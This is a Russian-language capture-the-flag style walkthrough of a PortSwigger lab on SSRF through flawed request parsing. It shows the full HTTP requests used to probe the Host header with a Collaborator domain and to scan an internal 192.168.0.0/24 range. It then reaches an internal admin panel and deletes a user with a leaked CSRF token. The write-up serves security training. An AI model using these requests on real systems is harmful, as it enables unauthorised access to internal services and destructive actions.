Перейдем на уязвимый ресурс

Перейдем в `Proxy` -> `HTTP history`
и изучим запросы

и перенесем запрос на корневую страницу в `Repeater`
Далее поймем, что при запросе 
```
GET https://0a290030049f232b82fa5b3f00740043.web-security-academy.net/ HTTP/2

Host: lk9zqgy9754ecoylnb7jk0r0argi4asz.oastify.com
```
где в HOST мы указали URL нашего Collaborator нам пришел ответ
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/1.png)

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/2.png)

Отлично, отправим наш запрос в `Intruder`

```
GET https://0a290030049f232b82fa5b3f00740043.web-security-academy.net/ HTTP/2

Host: 192.168.0.§0§
```
благодаря условию задания мы знаем - что он располагается в сетке 
`192.168.0.0/24`

по ней и произведем поиск 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/3.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/4.png)

и после выполнения атаки отсортируем по статус коду и получим что существует редирект на `Host: 192.168.0.159`

Вернемся в `Repeater` и посмотрим что там внутри
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/5.png)
```
GET https://0a290030049f232b82fa5b3f00740043.web-security-academy.net/ HTTP/2
Host: 192.168.0.159
```
и отравим запрос

и видим, что нам не разрешено. обидно 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/6.png)

попробуем это обойти точно так же, как мы и делали выше, вставив полный URL в страницу

```
GET https://0a290030049f232b82fa5b3f00740043.web-security-academy.net/admin HTTP/2
Host: 192.168.0.159
```

в ответ получим 
```
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="aShu5XLx4YUp9iJkQ4GvMT1vIebPbrMD">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
                    </form>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/7.png)

После чего модифицируем запрос 
```
GET https://0a290030049f232b82fa5b3f00740043.web-security-academy.net/admin/delete?csrf=aShu5XLx4YUp9iJkQ4GvMT1vIebPbrMD&username=carlos HTTP/2

Host: 192.168.0.159
```

и получим редирект, а после и уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/5.%20SSRF%20via%20flawed%20request%20parsing/pics%20for%20walkthrough/8.png)
